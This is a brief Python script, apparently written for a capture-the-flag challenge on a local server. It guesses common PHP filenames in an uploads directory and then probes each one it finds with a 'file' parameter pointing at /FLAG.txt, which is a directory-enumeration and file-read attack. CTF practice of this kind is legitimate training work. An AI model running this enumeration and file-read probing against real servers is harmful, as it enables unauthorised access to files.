import requests

base_url = "http://127.0.0.1:32891"

print("[+] Brute forcing common filenames in uploads directory...")

common_files = [
    "reader.php", "file.php", "get.php", "download.php", "view.php",
    "show.php", "display.php", "output.php", "print.php", "cat.php",
    "flag.php", "flag_reader.php", "read_flag.php", "getflag.php",
    "finder2.php", "finder_v2.php", "tool.php", "util.php", "helper.php"
]

found_files = []

for filename in common_files:
    resp = requests.get(f"{base_url}/posts/uploads/{filename}")
    
    if resp.status_code == 200:
        print(f"\n[+] FOUND: {filename}")
        print(f"Length: {len(resp.text)}")
        print(f"Content (first 200 chars): {resp.text[:200]}")
        
        if "FLAG{" in resp.text:
            print(f"\n[!!!] FLAG FOUND in {filename}!")
            print(resp.text)
            break
        
        found_files.append(filename)

if found_files:
    print(f"\n[+] Found files: {found_files}")
    print(f"\n[+] Testing each found file with parameters...")
    
    for filename in found_files:
        print(f"\n Testing {filename} with file parameter...")
        resp = requests.get(f"{base_url}/posts/uploads/{filename}", params={'file': '/FLAG.txt'})
        if "FLAG{" in resp.text:
            print(f"[!!!] FLAG FOUND with {filename}!")
            print(resp.text)
            break

